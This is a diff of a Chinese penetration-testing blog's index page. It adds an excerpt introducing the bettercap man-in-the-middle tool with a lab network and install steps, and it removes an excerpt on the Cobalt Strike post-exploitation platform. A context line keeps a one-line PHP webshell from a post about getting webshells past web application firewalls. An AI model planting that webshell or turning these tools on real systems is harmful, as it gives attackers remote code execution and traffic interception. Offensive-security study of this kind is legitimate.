@@ -139,6 +139,39 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/11/06/bettercap/">
+                轻量高效的 MITMF [ bettercap ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-11-06</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/bettercap/">bettercap</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 关于bettercap:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">一款相对还不错的中间人工具,出来也有些年头了,不过貌似维护的不是特别勤快</div><div class="line">从名字不难看出,作者是在有意向我们说明,这是一款比ettercap更好的中间人工具,<span class="string">'b'</span> <span class="keyword">is</span> better ^_^</div><div class="line">此外,工具本身基于<span class="keyword">ruby</span>,官方要求<span class="keyword">ruby</span>版本为 &gt;= <span class="number">1.9</span></div></pre></td></tr></table></figure></p>
+<p>0x02 环境介绍:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ubuntu</span> 16<span class="selector-class">.04</span><span class="selector-class">.3</span> <span class="selector-tag">LTS</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.12</span>    入侵者机器</div><div class="line"><span class="selector-tag">win2008r2cn</span>		<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span>    模拟正常服务器,事先已经装好各种服务</div><div class="line"><span class="selector-tag">win2008cn</span>		<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.131</span>   模拟正常服务器,事先已经装好各种服务</div><div class="line"><span class="selector-tag">win2012r2cn</span>		<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.122</span>   模拟正常服务器,事先已经装好各种服务</div></pre></td></tr></table></figure></p>
+<p>0x03 首先,安装好bettercap,如果你系统的ruby版本小于1.9记得务必先升级一下,更多详情请参考其官方说明,如下<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># apt-<span class="built_in">add</span>-repository <span class="keyword">pp</span><span class="variable">a:brightbox</span>/<span class="keyword">ruby</span>-ng</div><div class="line"># apt-<span class="built_in">get</span> <span class="keyword">update</span></div><div class="line"># apt-<span class="built_in">get</span> install ruby2.<span class="number">3</span> ruby2.<span class="number">3</span>-dev</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/11/06/bettercap/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/11/06/win-cmd/">
                 基础命令使用 [ win篇 ]
             </a>
@@ -590,40 +623,6 @@
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php $_POST[<span class="string">'fun'</span>]($_REQUEST[<span class="string">'req'</span>]);?&gt;</div></pre></td></tr></table></figure>
         </div>
         <a href="/2017/10/11/bypasswaf-for-webshell/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/09/23/cobalt-strike/">
-                cobalt strike 快速上手 [ 一 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-09-23</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/cobalt-strike/">cobalt strike</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 关于 Cobalt Strike<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">一款非常优秀的后渗透平台 [ 谁用谁知道,嘿嘿……说不好用的唯一原因可能就是很多用法还没有被自己挖掘出来,因为不会用,所以,才会感觉不好用 ]</div><div class="line">工具基于java,大部分功能在改进的基础上还是相对比较实用的,非常适合团队间协同作战</div><div class="line">更多详情请自行参考官网,这里就不啰嗦了,以下全部简称<span class="string">'cs'</span></div></pre></td></tr></table></figure></p>
-<p>0x02 基础环境简介:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">kali 	  		实际控制端	<span class="built_in">	ip </span> 192.168.1.144</div><div class="line">ubuntu 16.04 		自己公网的vps    <span class="built_in">	ip </span> 53.3.3.6		</div><div class="line">win2008R2 		目标机器		<span class="built_in">	ip </span> 192.168.1.191</div><div class="line">centos6.9 		已控肉鸡		<span class="built_in">	ip </span> 192.168.1.199</div><div class="line">win7cn			另一台肉鸡	<span class="built_in">	ip </span> 192.168.1.123</div></pre></td></tr></table></figure></p>
-<p>0x03 先来快速预览cs最基本的一些模块具体用途:</p>
-<p>团队服务器[teamserver]<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">主要是为了方便一个渗透团队内部能够及时共享所有成员的所有渗透信息,加强成员间的交流协作,以此提高渗透效率</div><div class="line">也就是说,正常情况下一个团队只需要起一个团队服务器即可,团队中的所有成员只需要拿着自己的cs客户端登录到团体服务器就能轻松实现协同作战</div><div class="line">当然,实际中可能为了尽可能久的维持住目标机器权限,还会习惯性的多开几个团队服务器,防止出现意外情况</div><div class="line">另外,团体服务器最好运行在linux平台上<span class="string">[本次演示所用的团队服务器系统为ubuntu 16.04]</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/09/23/cobalt-strike/" class="read-more">Read More</a>
     
 
 </div>
